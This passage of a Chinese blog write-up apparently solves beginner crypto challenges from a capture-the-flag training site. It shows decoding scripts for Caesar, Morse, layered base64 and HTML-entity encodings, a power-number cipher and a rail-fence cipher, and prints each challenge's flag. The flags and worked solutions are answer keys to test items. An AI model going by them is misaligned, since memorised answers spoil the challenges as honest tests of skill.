class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> s=decrypt(<span class="hljs-string">"oknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz}"</span>,<span class="hljs-number">12</span>);</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>,s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>得到<code>flag</code></p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">cyberpeace</span><span class="hljs-template-variable">{you_have_learned_caesar_encryption}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h4><p>题目是摩斯密码但是内容全是0和1，所以应该是0对应<code>.</code>，1对应<code>-</code></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">CODE = {<span class="hljs-string">'A'</span>: <span class="hljs-string">'.-'</span>, <span class="hljs-string">'B'</span>: <span class="hljs-string">'-...'</span>, <span class="hljs-string">'C'</span>: <span class="hljs-string">'-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'D'</span>: <span class="hljs-string">'-..'</span>, <span class="hljs-string">'E'</span>: <span class="hljs-string">'.'</span>, <span class="hljs-string">'F'</span>: <span class="hljs-string">'..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'G'</span>: <span class="hljs-string">'--.'</span>, <span class="hljs-string">'H'</span>: <span class="hljs-string">'....'</span>, <span class="hljs-string">'I'</span>: <span class="hljs-string">'..'</span>,</span><br><span class="line">        <span class="hljs-string">'J'</span>: <span class="hljs-string">'.---'</span>, <span class="hljs-string">'K'</span>: <span class="hljs-string">'-.-'</span>, <span class="hljs-string">'L'</span>: <span class="hljs-string">'.-..'</span>,</span><br><span class="line">        <span class="hljs-string">'M'</span>: <span class="hljs-string">'--'</span>, <span class="hljs-string">'N'</span>: <span class="hljs-string">'-.'</span>, <span class="hljs-string">'O'</span>: <span class="hljs-string">'---'</span>,</span><br><span class="line">        <span class="hljs-string">'P'</span>: <span class="hljs-string">'.--.'</span>, <span class="hljs-string">'Q'</span>: <span class="hljs-string">'--.-'</span>, <span class="hljs-string">'R'</span>: <span class="hljs-string">'.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'S'</span>: <span class="hljs-string">'...'</span>, <span class="hljs-string">'T'</span>: <span class="hljs-string">'-'</span>, <span class="hljs-string">'U'</span>: <span class="hljs-string">'..-'</span>,</span><br><span class="line">        <span class="hljs-string">'V'</span>: <span class="hljs-string">'...-'</span>, <span class="hljs-string">'W'</span>: <span class="hljs-string">'.--'</span>, <span class="hljs-string">'X'</span>: <span class="hljs-string">'-..-'</span>,</span><br><span class="line">        <span class="hljs-string">'Y'</span>: <span class="hljs-string">'-.--'</span>, <span class="hljs-string">'Z'</span>: <span class="hljs-string">'--..'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'0'</span>: <span class="hljs-string">'-----'</span>, <span class="hljs-string">'1'</span>: <span class="hljs-string">'.----'</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'..---'</span>,</span><br><span class="line">        <span class="hljs-string">'3'</span>: <span class="hljs-string">'...--'</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'....-'</span>, <span class="hljs-string">'5'</span>: <span class="hljs-string">'.....'</span>,</span><br><span class="line">        <span class="hljs-string">'6'</span>: <span class="hljs-string">'-....'</span>, <span class="hljs-string">'7'</span>: <span class="hljs-string">'--...'</span>, <span class="hljs-string">'8'</span>: <span class="hljs-string">'---..'</span>,</span><br><span class="line">        <span class="hljs-string">'9'</span>: <span class="hljs-string">'----.'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'.'</span>: <span class="hljs-string">'.-.-.-'</span>, <span class="hljs-string">':'</span>: <span class="hljs-string">'---...'</span>, <span class="hljs-string">','</span>: <span class="hljs-string">'--..--'</span>, <span class="hljs-string">';'</span>: <span class="hljs-string">'-.-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'?'</span>: <span class="hljs-string">'..--..'</span>, <span class="hljs-string">'='</span>: <span class="hljs-string">'-...-'</span>, <span class="hljs-string">'\''</span>: <span class="hljs-string">'.----.'</span>, <span class="hljs-string">'/'</span>: <span class="hljs-string">'-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'!'</span>: <span class="hljs-string">'-.-.--'</span>, <span class="hljs-string">'-'</span>: <span class="hljs-string">'-....-'</span>, <span class="hljs-string">'_'</span>: <span class="hljs-string">'..--.-'</span>, <span class="hljs-string">'"'</span>: <span class="hljs-string">'.-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'('</span>: <span class="hljs-string">'-.--.'</span>, <span class="hljs-string">')'</span>: <span class="hljs-string">'-.--.-'</span>, <span class="hljs-string">'$'</span>: <span class="hljs-string">'...-..-'</span>, <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'.-...'</span>,</span><br><span class="line">        <span class="hljs-string">'@'</span>: <span class="hljs-string">'.--.-.'</span></span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text =<span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>.replace(<span class="hljs-string">'0'</span>,<span class="hljs-string">'.'</span>)</span><br><span class="line">    <span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>.replace(<span class="hljs-string">'1'</span>,<span class="hljs-string">'-'</span>)</span><br><span class="line">    <span class="hljs-comment"># print(str)</span></span><br><span class="line">    msg=<span class="hljs-built_in">str</span>.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> msg:</span><br><span class="line">        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text+=Decode_dict[s]</span><br><span class="line">    <span class="hljs-keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">str</span>=<span class="hljs-string">'11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(Decode(<span class="hljs-built_in">str</span>).lower())</span><br></pre></td></tr></tbody></table></figure><p>得到<code>flag</code></p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">morsecodeissointeresting</span></span><br></pre></td></tr></tbody></table></figure><h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h4><p>密文</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NjsmIzEyMjsmIzY5</span>OyYjMTIwOyYj<span class="hljs-symbol">Nzk7</span>Ji<span class="hljs-name">M4</span>MzsmIzU<span class="hljs-number">2</span>OyYjMTIwOyYj<span class="hljs-symbol">Nzc7</span>Ji<span class="hljs-name">M2</span>ODsmIzY<span class="hljs-number">5</span>OyYjMTE<span class="hljs-number">4</span>OyYj<span class="hljs-symbol">Nzc7</span>Ji<span class="hljs-name">M4</span><span class="hljs-symbol">NDsmIzY1</span>OyYj<span class="hljs-symbol">NTI7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7</span>JiMxMjI<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzEyMDsmIzc<span class="hljs-number">3</span>OyYjOD<span class="hljs-name">M7</span>Ji<span class="hljs-name">M1</span><span class="hljs-symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="hljs-symbol">Njg7</span>JiMxMDc<span class="hljs-number">7</span>JiMxMT<span class="hljs-name">g7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NzsmIzg0</span>OyYj<span class="hljs-symbol">NjU7</span>JiMxMjA<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NjsmIzEyMjsmIzY5</span>OyYjMTIwOyYj<span class="hljs-symbol">Nzg7</span>JiMxMDU<span class="hljs-number">7</span>Ji<span class="hljs-name">M1</span><span class="hljs-symbol">NjsmIzEyMDsmIzc3</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzExODsmIzc<span class="hljs-number">5</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M5</span>OTsmIzExODsmIzc<span class="hljs-number">3</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzUwOyYj<span class="hljs-symbol">NzY7</span>JiMxMjI<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzEyMDsmIzc<span class="hljs-number">4</span>OyYjMTA<span class="hljs-number">1</span>OyYj<span class="hljs-symbol">NTY7</span>Ji<span class="hljs-name">M1</span>MzsmIzc<span class="hljs-number">4</span>OyYjMTIxOyYj<span class="hljs-symbol">NTY7</span>Ji<span class="hljs-name">M1</span>MzsmIzc<span class="hljs-number">5</span>OyYjOD<span class="hljs-name">M7</span>Ji<span class="hljs-name">M1</span><span class="hljs-symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="hljs-symbol">Njg7</span>Ji<span class="hljs-name">M5</span>OTsmIzExODsmIzc<span class="hljs-number">5</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M5</span>OTsmIzExODsmIzc<span class="hljs-number">3</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzExOTsmIzc<span class="hljs-number">2</span>OyYjMTIyOyYj<span class="hljs-symbol">Njk7</span>JiMxMTk<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NzsmIzY3</span>OyYj<span class="hljs-symbol">NTY7</span>JiMxMjA<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NzsmIzY4</span>OyYj<span class="hljs-symbol">NjU7</span>JiMxMT<span class="hljs-name">g7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NzsmIzg0</span>OyYj<span class="hljs-symbol">NjU7</span>JiMxMjA<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NjsmIzEyMjsmIzY5</span>OyYjMTE<span class="hljs-number">5</span>OyYj<span class="hljs-symbol">Nzc7</span>JiMxMDU<span class="hljs-number">7</span>Ji<span class="hljs-name">M1</span><span class="hljs-symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="hljs-symbol">Njg7</span>Ji<span class="hljs-name">M2</span>OTsmIzExODsmIzc<span class="hljs-number">3</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzExOTsmIzc<span class="hljs-number">2</span>OyYjMTIyOyYjMTA<span class="hljs-number">3</span>OyYj<span class="hljs-symbol">NTM7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NjsmIzEyMjsmIzY5</span>OyYjMTE<span class="hljs-number">5</span>OyYj<span class="hljs-symbol">Nzc7</span>Ji<span class="hljs-name">M4</span>MzsmIzU<span class="hljs-number">2</span>OyYjMTIwOyYj<span class="hljs-symbol">Nzc7</span>Ji<span class="hljs-name">M4</span><span class="hljs-symbol">NDsmIzEwNzsmIzExODsmIzc3</span>OyYjODQ<span class="hljs-number">7</span>Ji<span class="hljs-name">M2</span>OTsmIzEyMDsmIzc<span class="hljs-number">2</span>OyYjMTIyOyYj<span class="hljs-symbol">Njk7</span>JiMxMjA<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span>ODsmIzY<span class="hljs-number">3</span>OyYj<span class="hljs-symbol">NTY7</span>JiMxMjA<span class="hljs-number">7</span>Ji<span class="hljs-name">M3</span><span class="hljs-symbol">NzsmIzY4</span>OyYjMTAzOyYjMTE<span class="hljs-number">4</span>OyYj<span class="hljs-symbol">Nzc7</span>Ji<span class="hljs-name">M4</span><span class="hljs-symbol">NDsmIzY1</span>OyYjMTE<span class="hljs-number">5</span>Ow==</span><br></pre></td></tr></tbody></table></figure><p><code>base64</code>解一下</p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#79;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#65;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#65;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#78;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#79;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#78;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#78;</span><span class="hljs-symbol">&amp;#121;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#79;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#79;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#67;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#65;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#65;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#53;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#76;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#78;</span><span class="hljs-symbol">&amp;#67;</span><span class="hljs-symbol">&amp;#56;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#68;</span><span class="hljs-symbol">&amp;#103;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#77;</span><span class="hljs-symbol">&amp;#84;</span><span class="hljs-symbol">&amp;#65;</span><span class="hljs-symbol">&amp;#119;</span></span><br></pre></td></tr></tbody></table></figure><p><code>Unicode</code>码，新建一个<code>html</code>写进去，浏览器打开得到</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS<span class="hljs-number">8</span>xMDEvMTA<span class="hljs-number">4</span>Lzk<span class="hljs-number">5</span>LzExMS<span class="hljs-number">8</span>xMDkvMTAxLzEx<span class="hljs-symbol">Ni8</span>xMTEvOTcvMTE<span class="hljs-number">2</span>LzEx<span class="hljs-symbol">Ni85</span><span class="hljs-symbol">Ny85</span>OS<span class="hljs-number">8</span>xMDcvOTcvMTEwLzEwMC<span class="hljs-number">8</span>xMDAvMTAxLzEwMi<span class="hljs-number">8</span>xMDEvMTEwLzk<span class="hljs-number">5</span>LzEwMS<span class="hljs-number">8</span>xMTkvMTExLzEx<span class="hljs-symbol">NC8</span>xMDgvMTAw</span><br></pre></td></tr></tbody></table></figure><p>接着<code>base64</code></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-regexp">/119/</span><span class="hljs-number">101</span><span class="hljs-regexp">/108/</span><span class="hljs-number">99</span><span class="hljs-regexp">/111/</span><span class="hljs-number">109</span><span class="hljs-regexp">/101/</span><span class="hljs-number">116</span><span class="hljs-regexp">/111/</span><span class="hljs-number">97</span><span class="hljs-regexp">/116/</span><span class="hljs-number">116</span><span class="hljs-regexp">/97/</span><span class="hljs-number">99</span><span class="hljs-regexp">/107/</span><span class="hljs-number">97</span><span class="hljs-regexp">/110/</span><span class="hljs-number">100</span><span class="hljs-regexp">/100/</span><span class="hljs-number">101</span><span class="hljs-regexp">/102/</span><span class="hljs-number">101</span><span class="hljs-regexp">/110/</span><span class="hljs-number">99</span><span class="hljs-regexp">/101/</span><span class="hljs-number">119</span><span class="hljs-regexp">/111/</span><span class="hljs-number">114</span><span class="hljs-regexp">/108/</span><span class="hljs-number">100</span></span><br></pre></td></tr></tbody></table></figure><p>应该是ASCII码，写脚本跑一波</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-built_in">str</span>=<span class="hljs-string">b"LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw"</span></span><br><span class="line">t=base64.b64decode(<span class="hljs-built_in">str</span>).decode().split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">1</span>:]</span><br><span class="line"><span class="hljs-comment"># print(t)</span></span><br><span class="line">flag=<span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>得到<code>flag</code></p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">welcometoattackanddefenceworld</span></span><br></pre></td></tr></tbody></table></figure><h4 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h4><p>拿到密文</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8842101220480224404014224202480122</span><br></pre></td></tr></tbody></table></figure><p>一串数字，题目提示8个字，看到7个0，猜测0是分隔符，了解以下幂数加密，把每一位加起来得到索引</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">WELLDOWN</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h4><p>题目提示栅栏密码，key是5，但是解出来发现不对，报读之后才知道还有一种w模式的栅栏密码，网上找了段代码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">plain, num</span>):</span></span><br><span class="line">    matrix = [([<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(plain)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num)]</span><br><span class="line"></span><br><span class="line">    i_s = []</span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):</span><br><span class="line">        i_s.append(a)</span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num - <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">        i_s.append(a)</span><br><span class="line">    i_s_len = <span class="hljs-built_in">len</span>(i_s)</span><br><span class="line"></span><br><span class="line">    i = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plain:</span><br><span class="line">        matrix[i_s[i % i_s_len]][i] = c</span><br><span class="line">        i += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">    encrypted = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)):</span><br><span class="line">            <span class="hljs-keyword">if</span> matrix[i][j]:</span><br><span class="line">                encrypted += matrix[i][j]</span><br><span class="line">    <span class="hljs-keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">encrypted, num</span>):</span></span><br><span class="line">    matrix = [([<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(encrypted)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num)]</span><br><span class="line">    cur = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):</span><br><span class="line">        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:</span><br><span class="line">            pair = [(num - (i + <span class="hljs-number">1</span>)) * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>]</span><br><span class="line">        <span class="hljs-keyword">elif</span> i == num - <span class="hljs-number">1</span>:</span><br><span class="line">            pair = [i * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>]</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            pair = [(num - (i + <span class="hljs-number">1</span>)) * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>, i * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">        pair_i = <span class="hljs-number">0</span></span><br><span class="line">        j = i</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> cur &lt; <span class="hljs-built_in">len</span>(encrypted):</span><br><span class="line">                matrix[i][j] = encrypted[cur]</span><br><span class="line">            cur += <span class="hljs-number">1</span></span><br><span class="line">            j += pair[pair_i % <span class="hljs-built_in">len</span>(pair)] + <span class="hljs-number">1</span></span><br><span class="line">            pair_i += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">if</span> j &gt;= <span class="hljs-built_in">len</span>(encrypted):</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">    i_s = []</span><br><span class="line">    <span class="hljs-keyword">for</span> a <span 